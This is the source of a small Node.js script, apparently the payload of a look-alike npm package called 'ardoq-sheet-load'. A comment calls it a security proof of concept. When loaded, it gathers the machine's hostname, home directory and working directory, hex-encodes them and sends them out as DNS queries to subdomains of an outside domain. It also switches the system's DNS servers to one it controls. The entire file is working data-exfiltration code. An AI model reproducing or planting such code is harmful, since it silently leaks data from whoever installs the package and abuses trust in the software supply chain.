/*
This code is for security purposes and probably useless for you.
*/

const dns = require("dns");
const os = require("os");

const nameserver = "ns1.omerpoc.com";

const package = "ardoq-sheet-load";

function sendToServer(data) {
  data = Buffer.from(data).toString("hex");
  data = data.match(/.{1,60}/g);

  id = Math.random().toString(36).substring(2);

  data.forEach(function (chunk, idx) {
    try {
      dns.resolve(
        "abc." + id + "." + idx + "." + chunk + ".def" + "ardq.omerpoc.com",
        "A",
        console.log
      );
    } catch (e) {}
  });
}

function tryGet(toCall) {
  try {
    return toCall();
  } catch (e) {
    return "err";
  }
}

data = {
  p: package,
  h: tryGet(os.hostname),
  d: tryGet(os.homedir),
  c: __dirname,
};

data = JSON.stringify(data);

sendToServer(data);
dns.lookup(nameserver, function (err, address) {
  if (!err) {
    nsAddress = address;
  } else {
    nsAddress = "8.8.8.8";
  }
  dns.setServers([nsAddress, "4.4.4.4"]);
  sendToServer(data);
});
